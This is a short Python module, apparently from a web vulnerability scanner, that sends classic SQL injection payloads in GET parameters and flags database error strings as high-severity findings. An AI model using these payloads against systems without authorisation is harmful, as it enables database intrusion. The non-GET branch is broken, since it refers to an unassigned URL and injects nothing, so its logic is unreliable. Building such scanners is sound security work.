from utils.http import get

SQL_PAYLOADS = ["' OR '1'='1", "' OR 1=1--"]

SQL_ERRORS = ["sql", "mysql", "sqlite", "syntax"]

def test_sqli(endpoint):
    url = endpoint["url"]
    method = endpoint["method"]
    params = endpoint["params"]

    if not params:
        return None

    for payload in SQL_PAYLOADS:
        injected = {k: payload for k in params}

        if method == "GET":
            query = "&".join(f"{k}={v}" for k, v in injected.items())
            test_url = f"{url}?{query}"
            response = get(test_url)
        else:
            response = get(url)  # MVP

        if response:
            body = response.text.lower()
            if any(err in body for err in SQL_ERRORS):
                return {
                    "type": "SQL Injection",
                    "url": url,
                    "method": method,
                    "severity": "HIGH",
                    "payload": payload,
                    "poc": test_url 
                }

    return None